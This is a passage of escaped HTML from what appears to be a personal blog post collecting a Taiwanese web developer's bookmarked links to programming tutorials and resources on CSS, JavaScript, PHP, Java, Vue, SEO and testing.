rel=\"noopener\">http://jamestw.logdown.com/posts/283485--bash-profile-bashrc-difference</a></p>\n<p>All about Flask, the Python micro web framework inc. extensions &amp; tutorials<br><a href=\"https://flask.zeef.com/stefane.fermigier\" target=\"_blank\" rel=\"noopener\">https://flask.zeef.com/stefane.fermigier</a></p>\n<p>JavaScript 标准参考教程（alpha）<br><a href=\"http://javascript.ruanyifeng.com/advanced/backbonejs.html\" target=\"_blank\" rel=\"noopener\">http://javascript.ruanyifeng.com/advanced/backbonejs.html</a></p>\n<p> material design principle<br><a href=\"https://medium.com/google-developers/introducing-material-design-lite-3ce67098c031\" target=\"_blank\" rel=\"noopener\">https://medium.com/google-developers/introducing-material-design-lite-3ce67098c031</a><br><a href=\"http://getmdl.io/\" target=\"_blank\" rel=\"noopener\">http://getmdl.io/</a></p>\n<p>A Simple Example – Backbone.js Tutorial Part 1 – Collection based on JSON + View<br><a href=\"http://blog.joelberghoff.com/2012/07/22/backbone-js-tutorial-part-1/\" target=\"_blank\" rel=\"noopener\">http://blog.joelberghoff.com/2012/07/22/backbone-js-tutorial-part-1/</a></p>\n<p>[筆記] JavaScript 變數宣告與作用域<br><a href=\"http://kuro.tw/posts/2015/07/08/note-javascript-variables-declared-with-the-scope-scope\" target=\"_blank\" rel=\"noopener\">http://kuro.tw/posts/2015/07/08/note-javascript-variables-declared-with-the-scope-scope</a></p>\n<p>[JS][JQ]網頁Typing特效<br><a href=\"http://crazy-nerd.logdown.com/posts/284971-js-jq-typing-a-web-page-special-effects\" target=\"_blank\" rel=\"noopener\">http://crazy-nerd.logdown.com/posts/284971-js-jq-typing-a-web-page-special-effects</a></p>\n<p>pancakes<br><a href=\"https://pancake.io/\" target=\"_blank\" rel=\"noopener\">https://pancake.io/</a></p>\n<p>Apache2 /etc/hosts.deny ignored in Ubuntu 14.04<br><a href=\"http://serverfault.com/questions/619714/etc-hosts-deny-ignored-in-ubuntu-14-04\" target=\"_blank\" rel=\"noopener\">http://serverfault.com/questions/619714/etc-hosts-deny-ignored-in-ubuntu-14-04</a></p>\n<p>CLNDR.js ~ A jQuery Calendar Plugin<br><a href=\"http://kylestetz.github.io/CLNDR/\" target=\"_blank\" rel=\"noopener\">http://kylestetz.github.io/CLNDR/</a></p>\n<p>純CSS 以偽元素作照片說明遮罩<br><a href=\"http://www.mickey8509.com/2015/07/css_22.html\" target=\"_blank\" rel=\"noopener\">http://www.mickey8509.com/2015/07/css_22.html</a></p>\n<p>How to Center in CSS<br><a href=\"http://howtocenterincss.com/\" target=\"_blank\" rel=\"noopener\">http://howtocenterincss.com/</a></p>\n<p>JQuery 超簡單視差滾動<br><a href=\"http://www.mickey8509.com/2015/07/jquery.html\" target=\"_blank\" rel=\"noopener\">http://www.mickey8509.com/2015/07/jquery.html</a></p>\n<p>Simple Block, Simple Inline.<br><a href=\"http://limouren.blogspot.tw/2005/08/simplier-block.html\" target=\"_blank\" rel=\"noopener\">http://limouren.blogspot.tw/2005/08/simplier-block.html</a><br><a href=\"http://limouren.blogspot.tw/2005/08/simple-block-simple-inline.html\" target=\"_blank\" rel=\"noopener\">http://limouren.blogspot.tw/2005/08/simple-block-simple-inline.html</a></p>\n<p>margin負值<br><a href=\"http://www.w3cplus.com/css/the-definitive-guide-to-using-negative-margins.html\" target=\"_blank\" rel=\"noopener\">http://www.w3cplus.com/css/the-definitive-guide-to-using-negative-margins.html</a><br>如何正確實作出固定寬度且置中的版型<br><a href=\"http://jaceju.net/2005/04/16/9/\" target=\"_blank\" rel=\"noopener\">http://jaceju.net/2005/04/16/9/</a><br><a href=\"http://pinkyvivi.pixnet.net/blog/post/1131260-css%E2%88%A5%E6%8E%92%E7%89%88%E8%A7%80%E5%BF%B5-boxmodel%3Emargin%E3%80%81padding\" target=\"_blank\" rel=\"noopener\">http://pinkyvivi.pixnet.net/blog/post/1131260-css%E2%88%A5%E6%8E%92%E7%89%88%E8%A7%80%E5%BF%B5-boxmodel%3Emargin%E3%80%81padding</a></p>\n<p>PHP高效率寫法（詳解原因）<br><a href=\"http://blog.csdn.net/hguisu/article/details/7369827\" target=\"_blank\" rel=\"noopener\">http://blog.csdn.net/hguisu/article/details/7369827</a></p>\n<p>Wappalyzer - 查詢網站有用到什麼系統、框架…<br><a href=\"https://wappalyzer.com/download\" target=\"_blank\" rel=\"noopener\">https://wappalyzer.com/download</a></p>\n<h2 id=\"2015-08\"><a href=\"#2015-08\" class=\"headerlink\" title=\"2015/08\"></a>2015/08</h2><p>–<strong>SEO</strong><br>有關Web特殊符號<br><a href=\"https://www.facebook.com/groups/f2e.tw/permalink/868322123205154/\" target=\"_blank\" rel=\"noopener\">https://www.facebook.com/groups/f2e.tw/permalink/868322123205154/</a></p>\n<p>避免常見的六種 HTML5 錯誤用法<br><a href=\"http://waterlily-lsl.com/modules/article/view.article.php/c1/258\" target=\"_blank\" rel=\"noopener\">http://waterlily-lsl.com/modules/article/view.article.php/c1/258</a></p>\n<p>今天還有哪些 SEO 問題？（20140825）<br><a href=\"http://blog.seo-tw.org/2011/04/seo-step-by-step.html\" target=\"_blank\" rel=\"noopener\">http://blog.seo-tw.org/2011/04/seo-step-by-step.html</a></p>\n<p><a href=\"https://support.google.com/webmasters/answer/79812?hl=zh-Hant\" target=\"_blank\" rel=\"noopener\">https://support.google.com/webmasters/answer/79812?hl=zh-Hant</a><br><strong>SEO</strong>–END</p>\n<h2 id=\"都不知堆了多久-書籤堆積的內容該整理整理\"><a href=\"#都不知堆了多久-書籤堆積的內容該整理整理\" class=\"headerlink\" title=\"都不知堆了多久(書籤堆積的內容該整理整理)\"></a>都不知堆了多久(書籤堆積的內容該整理整理)</h2><p>樹梅派Raspberry Pi@台灣　非官方作業系統鏡像站(Mirror)<br><a href=\"http://ftp.yzu.edu.tw/linux/raspberrypi/\" target=\"_blank\" rel=\"noopener\">http://ftp.yzu.edu.tw/linux/raspberrypi/</a></p>\n<p>爬蟲教學<br><a href=\"http://www.largitdata.com/course_list/\" target=\"_blank\" rel=\"noopener\">http://www.largitdata.com/course_list/</a></p>\n<p>https協定說明<br><a href=\"https://speakerdeck.com/dannvix/https-works\" target=\"_blank\" rel=\"noopener\">https://speakerdeck.com/dannvix/https-works</a></p>\n<h2 id=\"Linux-同部備份\"><a href=\"#Linux-同部備份\" class=\"headerlink\" title=\"Linux 同部備份\"></a>Linux 同部備份</h2><p>透過rsync備份<br><a href=\"http://blog.davidou.org/archives/774\" target=\"_blank\" rel=\"noopener\">http://blog.davidou.org/archives/774</a><br>SSH + Rsync的備份機制<br><a href=\"http://kawsing.blogspot.tw/2011/05/ssh-rsync.html\" target=\"_blank\" rel=\"noopener\">http://kawsing.blogspot.tw/2011/05/ssh-rsync.html</a></p>\n<p>adobe 配色<br><a href=\"https://color.adobe.com/zh/explore/newest/\" target=\"_blank\" rel=\"noopener\">https://color.adobe.com/zh/explore/newest/</a></p>\n<p>Hyperlapse.js － 利用 Google 街景製作動態縮時效果<br><a href=\"http://blog.infographics.tw/2015/09/hyperlapse-js/\" target=\"_blank\" rel=\"noopener\">http://blog.infographics.tw/2015/09/hyperlapse-js/</a></p>\n<p>php中<strong>call(),</strong>get(),<strong>set(),</strong>construct(),__isset()等一些总结<br><a href=\"http://blog.51yip.com/php/947.html\" target=\"_blank\" rel=\"noopener\">http://blog.51yip.com/php/947.html</a></p>\n<p>Null vs. False vs. 0 in PHP<br><a href=\"http://stackoverflow.com/questions/137487/null-vs-false-vs-0-in-php\" target=\"_blank\" rel=\"noopener\">http://stackoverflow.com/questions/137487/null-vs-false-vs-0-in-php</a></p>\n<p>Python<br><a href=\"http://marco79423.twbbs.org/articles/category/python/\" target=\"_blank\" rel=\"noopener\">http://marco79423.twbbs.org/articles/category/python/</a></p>\n<p>Java设计模式（12）迭代模式（Iterator模式）<br><a href=\"http://www.cnblogs.com/Coda/p/4298454.html\" target=\"_blank\" rel=\"noopener\">http://www.cnblogs.com/Coda/p/4298454.html</a></p>\n<p>如何透過PHP、SOAP 及 WSDL撰寫Web Service<br><a href=\"https://ascc.sinica.edu.tw/iascc/articals.php?_section=2.4&amp;_op=?articalID:7073\" target=\"_blank\" rel=\"noopener\">https://ascc.sinica.edu.tw/iascc/articals.php?_section=2.4&amp;_op=?articalID:7073</a></p>\n<p>Android如何使用GET, POST取得資料<br><a href=\"http://blog.tonycube.com/2011/11/androidget-post.html\" target=\"_blank\" rel=\"noopener\">http://blog.tonycube.com/2011/11/androidget-post.html</a></p>\n<p>[PHP]這樣寫測試錯了嗎？<br><a href=\"http://jaceju.net/2015/10/14/what-is-test/\" target=\"_blank\" rel=\"noopener\">http://jaceju.net/2015/10/14/what-is-test/</a></p>\n<p><a href=\"http://mypaper.pchome.com.tw/zerojudge/post/1327159981\" target=\"_blank\" rel=\"noopener\">http://mypaper.pchome.com.tw/zerojudge/post/1327159981</a></p>\n<p>websphere<br><a href=\"http://big5.stcsm.gov.cn/gate/big5/www.stcsm.gov.cn/learning/lesson/xinxi/20020617/20020617.htm\" target=\"_blank\" rel=\"noopener\">http://big5.stcsm.gov.cn/gate/big5/www.stcsm.gov.cn/learning/lesson/xinxi/20020617/20020617.htm</a></p>\n<p>《JSP 2.0 動態網頁入門實務：Web應用程式/資料庫應用/JNDI/JavaMail/XML/AJAX/自訂標籤/JSTL/EL/MVC》筆記<br><a href=\"http://w1a2d3s4q5e6.blogspot.tw/2012/10/jsp-20-webjndijavamailxmlajaxjstlelmvc.html\" target=\"_blank\" rel=\"noopener\">http://w1a2d3s4q5e6.blogspot.tw/2012/10/jsp-20-webjndijavamailxmlajaxjstlelmvc.html</a></p>\n<p>DesignPatternsPHP<br><a href=\"http://designpatternsphp.readthedocs.io/en/latest/\" target=\"_blank\" rel=\"noopener\">http://designpatternsphp.readthedocs.io/en/latest/</a></p>\n<p>css filters<br><a href=\"http://designpatternsphp.readthedocs.io/en/latest/\" target=\"_blank\" rel=\"noopener\">http://designpatternsphp.readthedocs.io/en/latest/</a></p>\n<p>java 數字轉字串 字串轉數字<br><a href=\"http://hank20.blogspot.tw/2012/05/java.html\" target=\"_blank\" rel=\"noopener\">http://hank20.blogspot.tw/2012/05/java.html</a></p>\n<p>Java构造和解析Json数据的两种方法详解二<br><a href=\"http://www.cnblogs.com/lanxuezaipiao/archive/2013/05/24/3096437.html\" target=\"_blank\" rel=\"noopener\">http://www.cnblogs.com/lanxuezaipiao/archive/2013/05/24/3096437.html</a></p>\n<p>KKBOX iOS/Mac OS X 基本開發教材<br><a href=\"https://www.gitbook.com/book/zonble/kkbox-ios-dev/details\" target=\"_blank\" rel=\"noopener\">https://www.gitbook.com/book/zonble/kkbox-ios-dev/details</a></p>\n<p>資料視覺化<br><a href=\"http://blog.infographics.tw/\" target=\"_blank\" rel=\"noopener\">http://blog.infographics.tw/</a></p>\n<p>語言技術：Jav語言技術：Java Essencea Essence<br><a href=\"http://openhome.cc/Gossip/JavaEssence/index.ht00\" target=\"_blank\" rel=\"noopener\">http://openhome.cc/Gossip/JavaEssence/index.ht00</a></p>\n<p>Java transient关键字使用小记<br><a href=\"http://www.cnblogs.com/lanxuezaipiao/p/3369962.html\" target=\"_blank\" rel=\"noopener\">http://www.cnblogs.com/lanxuezaipiao/p/3369962.html</a></p>\n<p>What PHP based git web interface can be recommended<br>?<a href=\"https://ma.juii.net/blog/git-web-interface\" target=\"_blank\" rel=\"noopener\">https://ma.juii.net/blog/git-web-interface</a></p>\n<p>網站利用 Facebook 帳號登入 (使用 OAuth)<br><a href=\"http://sweeteason.pixnet.net/blog/post/40581580#start\" target=\"_blank\" rel=\"noopener\">http://sweeteason.pixnet.net/blog/post/40581580#start</a></p>\n<p>如何正確的使用 Runtime.exec()<br><a href=\"http://yindingtsai.blogspot.tw/2010/01/runtimeexec.html\" target=\"_blank\" rel=\"noopener\">http://yindingtsai.blogspot.tw/2010/01/runtimeexec.html</a></p>\n<p><a href=\"http://mei.homin.com.tw/circularNavPrototype-min.html\" target=\"_blank\" rel=\"noopener\">http://mei.homin.com.tw/circularNavPrototype-min.html</a></p>\n<p>筆記-CSS選擇器的套用優先順序<br><a href=\"http://blog.darkthread.net/post-2011-06-08-css-specificity.aspx\" target=\"_blank\" rel=\"noopener\">http://blog.darkthread.net/post-2011-06-08-css-specificity.aspx</a></p>\n<p>经网友提醒，才发现 new Date(‘2015-12-31’) 和 new Date(‘2015/12/31’) 是不一样的<br><a href=\"https://twitter.com/ruanyf/status/666266182505267200\" target=\"_blank\" rel=\"noopener\">https://twitter.com/ruanyf/status/666266182505267200</a></p>\n<p>Oracle SQL 結合型的子查詢 sub Query<br><a href=\"http://pclevin.blogspot.tw/search/label/Oracle%20SQL?updated-max=2014-05-25T18:22:00%2B08:00&amp;max-results=20&amp;start=20&amp;by-date=false\" target=\"_blank\" rel=\"noopener\">http://pclevin.blogspot.tw/search/label/Oracle%20SQL?updated-max=2014-05-25T18:22:00%2B08:00&amp;max-results=20&amp;start=20&amp;by-date=false</a></p>\n<p>MySQL 超新手入門（1）重新開始<br><a href=\"http://www.codedata.com.tw/database/mysql-tutorial-getting-started\" target=\"_blank\" rel=\"noopener\">http://www.codedata.com.tw/database/mysql-tutorial-getting-started</a></p>\n<p>子查詢 Select範例<br><a href=\"https://gradyli.wordpress.com/2008/12/02/%E5%AD%90%E6%9F%A5%E8%A9%A2-select%E7%AF%84%E4%BE%8B/\" target=\"_blank\" rel=\"noopener\">https://gradyli.wordpress.com/2008/12/02/%E5%AD%90%E6%9F%A5%E8%A9%A2-select%E7%AF%84%E4%BE%8B/</a></p>\n<p>matishsiao/phonegap-tutorial<br><a href=\"https://github.com/matishsiao/phonegap-tutorial\" target=\"_blank\" rel=\"noopener\">https://github.com/matishsiao/phonegap-tutorial</a><br>Copy to Clipboard in pure javascript - Coder Example<br><a href=\"https://coderexample.com/copy-to-clipboard-in-pure-javascript/\" target=\"_blank\" rel=\"noopener\">https://coderexample.com/copy-to-clipboard-in-pure-javascript/</a><br>Vue.js 台灣<br><a href=\"https://www.facebook.com/groups/vuejs.tw/permalink/1087045058041892/\" target=\"_blank\" rel=\"noopener\">https://www.facebook.com/groups/vuejs.tw/permalink/1087045058041892/</a><br>Front-End Developers Taiwan<br><a href=\"https://www.facebook.com/groups/f2e.tw/permalink/1051952364842128/\" target=\"_blank\" rel=\"noopener\">https://www.facebook.com/groups/f2e.tw/permalink/1051952364842128/</a><br>CSS only scroll indicator<br><a href=\"http://codepen.io/MadeByMike/details/ZOrEmr\" target=\"_blank\" rel=\"noopener\">http://codepen.io/MadeByMike/details/ZOrEmr</a><br>MKSB(en): Abusing XSS Filter: One ^ leads to XSS(CVE-2016-3212)<br><a href=\"http://mksben.l0.cm/2016/07/xxn-caret.html\" target=\"_blank\" rel=\"noopener\">http://mksben.l0.cm/2016/07/xxn-caret.html</a><br>下载量最高的 100 个 Laravel 扩展包推荐<em>PHPHub</em>中国最靠谱的<em>PHP</em>和<em>Laravel</em>开发者社区<br><a href=\"https://phphub.org/topics/2530\" target=\"_blank\" rel=\"noopener\">https://phphub.org/topics/2530</a><br>gitignore.io - Create Useful .gitignore Files For Your Project<br><a href=\"https://www.gitignore.io/\" target=\"_blank\" rel=\"noopener\">https://www.gitignore.io/</a><br>用 JavaScript 學習資料結構和演算法：堆疊（Stack）篇 | TechBridge 技術共筆部落格<br><a href=\"http://blog.techbridge.cc/2016/06/24/javascript-data-structure-algorithm-stack/\" target=\"_blank\" rel=\"noopener\">http://blog.techbridge.cc/2016/06/24/javascript-data-structure-algorithm-stack/</a><br>webdriver.io - 前端測試入門筆記… « tedshd’s DevNote<br><a href=\"http://blog.tedshd.io/posts/774036-webdriverio-introduction-to-front-end-test-notes\" target=\"_blank\" rel=\"noopener\">http://blog.tedshd.io/posts/774036-webdriverio-introduction-to-front-end-test-notes</a><br>PJCHENder網頁前端資源站<br><a href=\"https://www.facebook.com/pjchender/photos/?tab=album&amp;album_id=1078492305569538\" target=\"_blank\" rel=\"noopener\">https://www.facebook.com/pjchender/photos/?tab=album&amp;album_id=1078492305569538</a><br>How to run accessibility testing demos – Shopify UX – Medium<br><a href=\"https://medium.com/shopify-ux/how-to-run-accessibility-testing-demos-602005e176d0\" target=\"_blank\" rel=\"noopener\">https://medium.com/shopify-ux/how-to-run-accessibility-testing-demos-602005e176d0</a><br>一頭栽入 Vue.js TDD 的世界 - Google 簡報<br><a href=\"https://docs.google.com/presentation/d/1YxsUucBZNlN-YLjDNoF8-Wk0h-sG4nAqw9eT4Y2OGMo/edit#slide=id.p\" target=\"_blank\" rel=\"noopener\">https://docs.google.com/presentation/d/1YxsUucBZNlN-YLjDNoF8-Wk0h-sG4nAqw9eT4Y2OGMo/edit#slide=id.p</a><br>Vuediner #2 - Ping Pong ! Vuex + Laravel by 鄭宇翔 - YouTube<br><a href=\"https://www.youtube.com/watch?v=C1aLFTs6QM8\" target=\"_blank\" rel=\"noopener\">https://www.youtube.com/watch?v=C1aLFTs6QM8</a><br>Green Man Is Walking<br><a href=\"http://codepen.io/jsgao0/details/AXgwZN\" target=\"_blank\" rel=\"noopener\">http://codepen.io/jsgao0/details/AXgwZN</a><br>Front-End Developers Taiwan<br><a href=\"https://www.facebook.com/groups/f2e.tw/permalink/1040322676005097/\" target=\"_blank\" rel=\"noopener\">https://www.facebook.com/groups/f2e.tw/permalink/1040322676005097/</a><br>Python Taiwan<br><a href=\"https://www.facebook.com/groups/pythontw/permalink/10155214580238438/\" target=\"_blank\" rel=\"noopener\">https://www.facebook.com/groups/pythontw/permalink/10155214580238438/</a><br>jQuery Ajax API 實作以及 Template 介紹 « MUKI space<em><br><a href=\"http://muki.tw/tech/jquery-ajax-crud-and-template/\" target=\"_blank\" rel=\"noopener\">http://muki.tw/tech/jquery-ajax-crud-and-template/</a><br>Rdatasets<br><a href=\"http://vincentarelbundock.github.io/Rdatasets/\" target=\"_blank\" rel=\"noopener\">http://vincentarelbundock.github.io/Rdatasets/</a><br>Cleave.js - Format input text content when you are typing<br><a href=\"http://nosir.github.io/cleave.js/\" target=\"_blank\" rel=\"noopener\">http://nosir.github.io/cleave.js/</a><br>ES6 你可能不知道的事 - 基础篇 | Taobao FED | 淘宝前端团队<br><a href=\"http://taobaofed.org/blog/2016/07/22/es6-basics/index.html\" target=\"_blank\" rel=\"noopener\">http://taobaofed.org/blog/2016/07/22/es6-basics/index.html</a><br>Map Fiddle<br><a href=\"http://mapfiddle.org/\" target=\"_blank\" rel=\"noopener\">http://mapfiddle.org/</a><br>gjccing/c3s: use css selector to select js object content.<br><a href=\"https://github.com/gjccing/c3s\" target=\"_blank\" rel=\"noopener\">https://github.com/gjccing/c3s</a><br>Laradiner 讀書會 - SOLID 原則談 DIP 依頼反轉原則 by 閃亮亮 - YouTube<br><a href=\"https://www.youtube.com/watch?v=k3uERr0P9iE\" target=\"_blank\" rel=\"noopener\">https://www.youtube.com/watch?v=k3uERr0P9iE</a><br>PHP 台灣<br><a href=\"https://www.facebook.com/groups/199493136812961/permalink/1032002790228654/\" target=\"_blank\" rel=\"noopener\">https://www.facebook.com/groups/199493136812961/permalink/1032002790228654/</a><br>[JavaScript] 幾個實用的 JS 小技巧 · Larry<br><a href=\"http://larry850806.github.io/2016/07/16/JS-tips/\" target=\"_blank\" rel=\"noopener\">http://larry850806.github.io/2016/07/16/JS-tips/</a><br>Google 我不是機器人 reCAPTCHA Ajax 驗證碼教學範例 for PHP | MIS腳印<br><a href=\"http://www.smalljacky.com/programming-language/php/google-recaptcha-ajax-for-php/\" target=\"_blank\" rel=\"noopener\">http://www.smalljacky.com/programming-language/php/google-recaptcha-ajax-for-php/</a><br>網站 icon 生成器，一鍵通殺全平台。 - 踢踢五<br><a href=\"http://tt5.org/%e7%b6%b2%e7%ab%99-icon-%e7%94%9f%e6%88%90%e5%99%a8%ef%bc%8c%e4%b8%80%e9%8d%b5%e9%80%9a%e6%ae%ba%e5%85%a8%e5%b9%b3%e5%8f%b0/\" target=\"_blank\" rel=\"noopener\">http://tt5.org/%e7%b6%b2%e7%ab%99-icon-%e7%94%9f%e6%88%90%e5%99%a8%ef%bc%8c%e4%b8%80%e9%8d%b5%e9%80%9a%e6%ae%ba%e5%85%a8%e5%b9%b3%e5%8f%b0/</a><br>dylandy/tobopomo.js: A simple and easy plugin for convert string to Bopomo script and Chinese Characters.<br><a href=\"https://github.com/dylandy/tobopomo.js\" target=\"_blank\" rel=\"noopener\">https://github.com/dylandy/tobopomo.js</a><br>淺入淺出 eslint 與實作 · De-bug: 一鍵跑版<br><a href=\"http://abalone0204.github.io/2016/07/11/eslint-fxcking-setup/\" target=\"_blank\" rel=\"noopener\">http://abalone0204.github.io/2016/07/11/eslint-fxcking-setup/</a><br>開發網站時，寫測試的3個簡單方法 | 轉個彎日誌<br><a href=\"http://blog.turn.tw/?p=3250\" target=\"_blank\" rel=\"noopener\">http://blog.turn.tw/?p=3250</a><br>emoji-picker Demo<br><a href=\"http://onesignal.github.io/emoji-picker/\" target=\"_blank\" rel=\"noopener\">http://onesignal.github.io/emoji-picker/</a><br>CSS for Decoration<br><a href=\"http://razvancaliman.com/css-for-decoration/#/\" target=\"_blank\" rel=\"noopener\">http://razvancaliman.com/css-for-decoration/#/</a><br>Front-End Developers Taiwan<br><a href=\"https://www.facebook.com/groups/f2e.tw/permalink/1021845897852775/\" target=\"_blank\" rel=\"noopener\">https://www.facebook.com/groups/f2e.tw/permalink/1021845897852775/</a><br>Vuedinner #1 第一次用 Vue.js 就愛上 by Kuro - YouTube<br><a href=\"https://www.youtube.com/watch?v=jXdZlbH_ut8\" target=\"_blank\" rel=\"noopener\">https://www.youtube.com/watch?v=jXdZlbH_ut8</a><br>[教學] 寫給會在部落格中撰寫程式碼的你 ─ 在網頁中嵌入高亮程式碼上色 (syntax highlighting) | PJCHENder愛分享<br><a href=\"https://pjchender.blogspot.tw/2016/06/prism-syntax-highlighting.html\" target=\"_blank\" rel=\"noopener\">https://pjchender.blogspot.tw/2016/06/prism-syntax-highlighting.html</a><br>CSS &amp; HTML - 純CSS點擊下拉式選單 - Twincl<br><a href=\"https://tw.twincl.com/css-html/\" target=\"_blank\" rel=\"noopener\">https://tw.twincl.com/css-html/</a></em>6630<br>A-Frame – Building Blocks for the VR Web<br><a href=\"https://aframe.io/\" target=\"_blank\" rel=\"noopener\">https://aframe.io/</a><br>l3vRj14XAQFWBi3hm.gif（GIF 圖片，962x416 像素）<br><a href=\"http://i.giphy.com/l3vRj14XAQFWBi3hm.gif\" target=\"_blank\" rel=\"noopener\">http://i.giphy.com/l3vRj14XAQFWBi3hm.gif</a><br>網站前端測試實做手冊 by caesarchi [Leanpub PDF/iPad/Kindle]<br><a href=\"https://leanpub.com/frontend_e2e_test_guidebook\" target=\"_blank\" rel=\"noopener\">https://leanpub.com/frontend_e2e_test_guidebook</a><br>css - Which is better, #fff or #FFF? - Stack Overflow<br><a href=\"http://stackoverflow.com/questions/3733172/which-is-better-fff-or-fff\" target=\"_blank\" rel=\"noopener\">http://stackoverflow.com/questions/3733172/which-is-better-fff-or-fff</a><br>An Overview of HTML5 Semantics by Michelle Lee on CodePen<br><a href=\"http://codepen.io/mi-lee/post/an-overview-of-html5-semantics\" target=\"_blank\" rel=\"noopener\">http://codepen.io/mi-lee/post/an-overview-of-html5-semantics</a><br>ceesvanegmond/minify: A PHP package for minifying your .css and .js.<br><a href=\"https://github.com/ceesvanegmond/minify\" target=\"_blank\" rel=\"noopener\">https://github.com/ceesvanegmond/minify</a><br>猴子也能看懂的 React 教學 - 1 - React 概念 - 初雪的中二 &amp; 爆肝工程師之路<br><a href=\"https://j6qup3.github.io/2016/08/06/%E7%8C%B4%E5%AD%90%E4%B9%9F%E8%83%BD%E7%9C%8B%E6%87%82%E7%9A%84-React-%E6%95%99%E5%AD%B8-1/index.html\" target=\"_blank\" rel=\"noopener\">https://j6qup3.github.io/2016/08/06/%E7%8C%B4%E5%AD%90%E4%B9%9F%E8%83%BD%E7%9C%8B%E6%87%82%E7%9A%84-React-%E6%95%99%E5%AD%B8-1/index.html</a><br>Quill - Your powerful, rich text editor<br><a href=\"http://quilljs.com/\" target=\"_blank\" rel=\"noopener\">http://quilljs.com/</a><br>幾個 HTML 秘訣 | 部落格 | Mozilla Taiwan<br><a href=\"http://blog.mozilla.com.tw/posts/9085/html-tips\" target=\"_blank\" rel=\"noopener\">http://blog.mozilla.com.tw/posts/9085/html-tips</a><br>Easy Copy :: Firefox 附加元件</p>\n<h2 id=\"https-addons-mozilla-org-zh-TW-firefox-addon-easy-copy-src-search\"><a href=\"#https-addons-mozilla-org-zh-TW-firefox-addon-easy-copy-src-search\" class=\"headerlink\" title=\"https://addons.mozilla.org/zh-TW/firefox/addon/easy-copy/?src=search\"></a><a href=\"https://addons.mozilla.org/zh-TW/firefox/addon/easy-copy/?src=search\" target=\"_blank\" rel=\"noopener\">https://addons.mozilla.org/zh-TW/firefox/addon/easy-copy/?src=search</a></h2><p><a href=\"http://www.retailscm.com/\" target=\"_blank\" rel=\"noopener\">http://www.retailscm.com/</a><br><a href=\"http://www.retailscm.com/\" target=\"_blank\" rel=\"noopener\">http://www.retailscm.com/</a><br><a href=\"https://css-tricks.com/snippets/css/a-guide-to-flexbox/\" target=\"_blank\" rel=\"noopener\">https://css-tricks.com/snippets/css/a-guide-to-flexbox/</a><br><a href=\"http://www.rightrelevance.com/search/articles?query=python&amp;taccount=pythonrr\" target=\"_blank\" rel=\"noopener\">http://www.rightrelevance.com/search/articles?query=python&amp;taccount=pythonrr</a><br><a href=\"http://blog.infographics.tw/2015/11/chartico-introduction/\" target=\"_blank\" rel=\"noopener\">http://blog.infographics.tw/2015/11/chartico-introduction/</a><br><a href=\"https://segmentfault.com/a/1190000004079979https://www.awesomes.cn/\" target=\"_blank\" rel=\"noopener\">https://segmentfault.com/a/1190000004079979https://www.awesomes.cn/</a><br><a href=\"http://www.beansmile.com/blog/posts/2015-01-10\" target=\"_blank\" rel=\"noopener\">http://www.beansmile.com/blog/posts/2015-01-10</a><br><a href=\"http://ithelp.ithome.com.tw/articles/10024779\" target=\"_blank\" rel=\"noopener\">http://ithelp.ithome.com.tw/articles/10024779</a><br><a href=\"http://code.kpman.cc/2014/10/14/sublime-text-3-mac-%E6%8C%87%E5%8D%97/\" target=\"_blank\" rel=\"noopener\">http://code.kpman.cc/2014/10/14/sublime-text-3-mac-%E6%8C%87%E5%8D%97/</a><br>你都去哪裡看技術文章？<br><a href=\"https://vinta.ws/code/where-to-find-great-content-to-read.html\" target=\"_blank\" rel=\"noopener\">https://vinta.ws/code/where-to-find-great-content-to-read.html</a><br>Selenium自動化測試技術文章彙整 (140+篇)<br><a href=\"http://www.qa-knowhow.com/?p=3811\" target=\"_blank\" rel=\"noopener\">http://www.qa-knowhow.com/?p=3811</a><br><a href=\"http://headstats.com/\" target=\"_blank\" rel=\"noopener\">http://headstats.com/</a><br><a href=\"http://comdan66.github.io/ThetaS/\" target=\"_blank\" rel=\"noopener\">http://comdan66.github.io/ThetaS/</a><br><a href=\"https://github.com/fza\" target=\"_blank\" rel=\"noopener\">https://github.com/fza</a><br>ninotto/Faker<br><a href=\"https://blog.gtwang.org/linux/change-linux-default-editor/\" target=\"_blank\" rel=\"noopener\">https://blog.gtwang.org/linux/change-linux-default-editor/</a><br><a href=\"https://dotblogs.com.tw/joysdw12/2013/10/07/net-dll-reflector-decomplier\" target=\"_blank\" rel=\"noopener\">https://dotblogs.com.tw/joysdw12/2013/10/07/net-dll-reflector-decomplier</a><br><a href=\"http://nitroxenon.com/eziriz-net-reactor\" target=\"_blank\" rel=\"noopener\">http://nitroxenon.com/eziriz-net-reactor</a></p>\n<p><a href=\"http://atic-tw.blogspot.tw/2014/04/sqlmap-sql-injection.html\" target=\"_blank\" rel=\"noopener\">http://atic-tw.blogspot.tw/2014/04/sqlmap-sql-injection.html</a><br><a href=\"http://nano-chicken.blogspot.tw/2015/06/apt-get-updatenon-lts.html\" target=\"_blank\" rel=\"noopener\">http://nano-chicken.blogspot.tw/2015/06/apt-get-updatenon-lts.html</a></p>\n<p>App Inventor 2 啟用多點觸控<br><a href=\"http://t301000.blogspot.tw/\" target=\"_blank\" rel=\"noopener\">http://t301000.blogspot.tw/</a></p>\n<p>–待整理<br><a href=\"http://es6.ruanyifeng.com/\" target=\"_blank\" rel=\"noopener\">http://es6.ruanyifeng.com/</a><br><a href=\"https://stedolan.github.io/jq/http://jsnwork.kiiuo.com/archives/2258/jquery-javascript-%E6%95%99%E4%BD%A0%E5%A6%82%E4%BD%95%E8%A3%BD%E4%BD%9C%E5%9C%96%E7%89%87%E4%B8%8A%E5%82%B3%E5%89%8D%E7%9A%84%E9%A0%90%E8%A6%BD%E5%9C%96\" target=\"_blank\" rel=\"noopener\">https://stedolan.github.io/jq/http://jsnwork.kiiuo.com/archives/2258/jquery-javascript-%E6%95%99%E4%BD%A0%E5%A6%82%E4%BD%95%E8%A3%BD%E4%BD%9C%E5%9C%96%E7%89%87%E4%B8%8A%E5%82%B3%E5%89%8D%E7%9A%84%E9%A0%90%E8%A6%BD%E5%9C%96</a><br><a href=\"http://oomusou.io/phpstorm/phpstorm-tdd-refactor/\" target=\"_blank\" rel=\"noopener\">http://oomusou.io/phpstorm/phpstorm-tdd-refactor/</a><br><a href=\"http://blog.seo-tw.org/\" target=\"_blank\" rel=\"noopener\">http://blog.seo-tw.org/</a><br><a href=\"http://www.rightrelevance.com/search/articles?query=python&amp;taccount=pythonrr\" target=\"_blank\" rel=\"noopener\">http://www.rightrelevance.com/search/articles?query=python&amp;taccount=pythonrr</a><br><a href=\"http://www.virtuosoft.eu/code/bootstrap-duallistbox/\" target=\"_blank\" rel=\"noopener\">http://www.virtuosoft.eu/code/bootstrap-duallistbox/</a><br><a 